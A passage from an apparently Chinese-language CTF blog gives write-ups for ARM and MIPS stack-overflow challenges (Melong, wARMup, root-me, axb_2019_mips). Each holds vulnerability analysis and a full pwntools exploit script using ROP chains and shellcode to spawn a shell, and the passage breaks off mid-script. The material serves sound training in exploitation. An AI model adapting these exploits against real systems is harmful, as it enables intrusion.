<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./root_me_stack_spraying&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_spraying&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_spraying&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./root_me_stack_spraying&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_r3_pc = <span class="number">0x000103f8</span></span><br><span class="line">pop_r11_pc = <span class="number">0x00010634</span></span><br><span class="line">padding = <span class="number">0x44</span></span><br><span class="line">main_scanf = <span class="number">0x0001065C</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload1 = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(padding-<span class="number">4</span>) + p32(elf.bss() + <span class="number">0x300</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc)</span><br><span class="line">payload1 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>)  <span class="comment"># R3:write address</span></span><br><span class="line">payload1 += p32(main_scanf)         </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(elf.bss()))</span><br><span class="line">log.info(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;exec&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = &quot;/bin;sh\x00&quot; + p32(elf.sym[&#x27;exec&#x27;])</span></span><br><span class="line"><span class="comment"># payload2 += p32(pop_r3_pc) + p32(elf.bss() + 0x300-0x4*3) + p32(pop_r11_pc)</span></span><br><span class="line"><span class="comment"># payload2 += p32(elf.bss() + 0x300-0x4) + p32(0x0001067C)</span></span><br><span class="line">payload2 = <span class="string">&quot;skye;sh\x00&quot;</span> + p32(elf.sym[<span class="string">&#x27;exec&#x27;</span>])</span><br><span class="line">payload2 += p32(pop_r3_pc) + p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>) + p32(pop_r11_pc)</span><br><span class="line">payload2 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>) + p32(<span class="number">0x0001067C</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Codegate2018-Melong"><a href="#Codegate2018-Melong" class="headerlink" title="Codegate2018_Melong"></a>Codegate2018_Melong</h2><ol>
<li>分析压栈变量个数</li>
<li>分析rop返回位置</li>
<li>libc静态加载特性</li>
</ol>
<h3 id="基本情况-3"><a href="#基本情况-3" class="headerlink" title="基本情况"></a>基本情况</h3><p>32位ARM动态链接程序，仅开启NX保护。</p>
<p>程序是一个 BMI 计算器，在 write_diary(len, addr); 存在栈溢出，长度实际上是经过 PT 函数计算 check 函数输入的身高体重数据后，得出的 BMI 指数，addr 对应是 main 函数中的局部变量。</p>
<p>PT 函数挺奇特的，如果需要控制返回值为输入的 size 就需要满足 if 条件。exc2 一直都没有赋值为 0 ，所以需要利用 malloc 申请失败返回 null 。因此这里输入 -1 ，将返回值设置为 -1 。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171653.png" alt="image-20210123003225618"></p>
<p>在 PT 中 size 数据类型为 size_t ，在 write_diary 用 unsigned int 存储原本 -1 变成非常大的数，造成栈溢出。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171654.png" alt="image-20210123003805545"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>和 x86 架构下 ret2libc 的思路一样，只是不同架构 payload 需要调整。</p>
<p>padding 长度和 x86 一样，可以在 ida 中看出来是 50+4 ：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171655.png" alt="image-20210123004311891"></p>
<p><strong>注意在 arm 程序没有 ebp 这个位置的填充</strong>，具体可以从汇编分析得出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUSH    &#123;R11,LR&#125;;将R11+LR指向的内容压栈</span><br><span class="line">ADD     R11, SP, #4;</span><br><span class="line">SUB     SP, SP, #0x50;栈顶向低地址移动0x50</span><br><span class="line">LDR     R3, &#x3D;stdin__GLIBC_2.4;函数体开始</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>只有 R11 一个寄存器压栈了，所以 padding 应该为：50+4</p>
<p>ROPgadget 能找到合适的 gadget ：<code>0x00011bbc : pop &#123;r0, pc&#125;</code> ，泄露 libc ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding+p32(gadget)+p32(got)+p32(plt)</span><br></pre></td></tr></table></figure>

<p>返回 main 函数无论怎么搞都返回不了。但是<strong>发现 libc 是静态加载的，两次泄露地址都是一样的</strong>，所以直接调用 system :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding+p32(gadget)+p32(binsh)+p32(system)</span><br></pre></td></tr></table></figure>

<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./melong&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = 0xff6b6f98 - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">libc_base = <span class="number">0xff6bb770</span> - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload  = &#x27;A&#x27; * 0x54 + p32(0x00011bbc) + p32(elf.got[&#x27;puts&#x27;]) + p32(elf.plt[&#x27;puts&#x27;])#+p32(elf.sym[&#x27;main&#x27;])*2</span></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x54</span> + p32(<span class="number">0x00011bbc</span>) + p32(bin_addr) + p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your height(meters) : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your weight(kilograms) : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How long do you want to take personal training?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h2><h3 id="基本情况-4"><a href="#基本情况-4" class="headerlink" title="基本情况"></a>基本情况</h3><p>32 位动态链接 arm 程序只打开了 nx 保护，存在 0x10 字节溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [sp+4h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to bi0s CTF!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">120u</span>);         <span class="comment">// 溢出0x10</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>长度是足够完成 ret2libc 操作，但是没有控制 r0 的 gadget ：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171656.png" alt="image-20210123162353020"></p>
<p>这里思路是利用现有 gadget 控制 r3 为 bss 段上地址,利用 main 函数本身汇编代码调用 read 将 shellcode 写入到 bss 上。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171657.png" alt="image-20210123162740601"></p>
<p>构造写入 payload 问题不大：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>+p32(pop_r3_pc)+p32(elf.bss()+<span class="number">0x100</span>)+p32(main_read)</span><br></pre></td></tr></table></figure>

<p>问题是在再次控制程序流到 bss 上，执行 shellocde 。这里通过调试发现 armeabi（32位arm）出栈时使用的汇编 <code>pop    &#123;fp, pc&#125;</code> （fp和r11是同一个寄存器）给 pc 赋值。这句汇编是<strong>将 fp 指向地址的值赋给 pc</strong> ，而这个 fp 类似于 ebp ，pc 等于 eip 。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171658.png" alt="image-20210123171408650"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171659.png" alt="image-20210123171453220"></p>
<blockquote>
<p>这里截图使用下面的 payload ，也就是 r11 的值是 bss+0x100</p>
</blockquote>
<p>如果我们用上面这个 payload 去打，当利用 main 函数内汇编调用完 read 后会继续运行到 main 结尾，也就是会再次调用 mian 结尾的出栈流程。由于之前 fp 被赋值为 <code>aaaa</code> ，所以程序会 <code>pop [fp,pc&#125;</code> 处报错，因为 0x61616161 不存在。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171700.png" alt="image-20210123171145355"></p>
<p>我们就利用这一点将 fp 覆盖为 bss 段，实现调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+p32(elf.bss()+<span class="number">0x100</span>)+p32(pop_r4_pc)+p32(elf.bss()+<span class="number">0x100</span>)+p32(main_read)</span><br></pre></td></tr></table></figure>

<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><blockquote>
<p>迁移完，要Shellcode 前面加个地址跳转</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./wARMup&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./wARMup&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./wARMup&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./wARMup&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">100</span><span class="comment">#104</span></span><br><span class="line">pop_r3_pc = <span class="number">0x00010364</span></span><br><span class="line">main_read = <span class="number">0x00010530</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span></span><br><span class="line">payload = padding*<span class="string">&#x27;a&#x27;</span>+p32(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload += p32(pop_r3_pc)+p32(elf.bss()+<span class="number">0x100</span>)+p32(main_read)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(p32(elf.bss()+<span class="number">0x100</span>+<span class="number">0x4</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h2><h3 id="基本情况-5"><a href="#基本情况-5" class="headerlink" title="基本情况"></a>基本情况</h3><p>32 位动态链接 arm 程序，存在 scanf 函数溢出，程序自身泄露栈地址。</p>
<p>程序功能是可以重复向局部变量上写入，由于输入函数采用 scanf 长度被我们所控制。</p>
<p>思路是先获取程序泄露的栈地址，然后写入 shellcode 控制 pc 跳转执行。这里用 cycli 测出来的 padding 是 0x50 ，实际调试发现需要填充 0x54 ，0x50-0x54 被填充在 r11 (fp) 。</p>
<h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0xA0</span>,<span class="string">&#x27;\x90&#x27;</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_addr)</span><br><span class="line"><span class="comment">#payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h2><blockquote>
<p>题目源码：<a target="_blank" rel="noopener" href="https://github.com/D0g3-Lab/i-SOON_CTF_2019/blob/master/Pwn/mips">:link:</a></p>
</blockquote>
<h3 id="基本情况-6"><a href="#基本情况-6" class="headerlink" title="基本情况"></a>基本情况</h3><p>qemu-mipsel运行，提示缺少库，最快速的解决方法是下载现成的库，省去自己编译。Mipsel的uclibc库在这里<a target="_blank" rel="noopener" href="https://github.com/MonkeyJacky/mipsel-linux-uclibc">https://github.com/MonkeyJacky/mipsel-linux-uclibc</a></p>
<p>vuln 函数里存在栈溢出。</p>
<p>$fp寄存器的值，在我们溢出后函数结束时，就会被栈里的值覆盖，因此,$fp可控，从而$v0可控，从而$a1可控。而$a0、$a2也在代码里控制住了。因此,我们让$a1指向bss段，从而可以向bss段输入shellcode。当read结束后, move  $sp, $fp指令会使得栈发生迁移，我们在bss段的shellcode前面放置shellcode的地址，，这样shellcode的地址就会被放入到$ra寄存器，进而可以ret到shellcode。</p>
<h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;pwn2&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">28110</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-uclibc&quot;</span>, <span class="string">&quot;pwn2&quot;</span>])</span><br><span 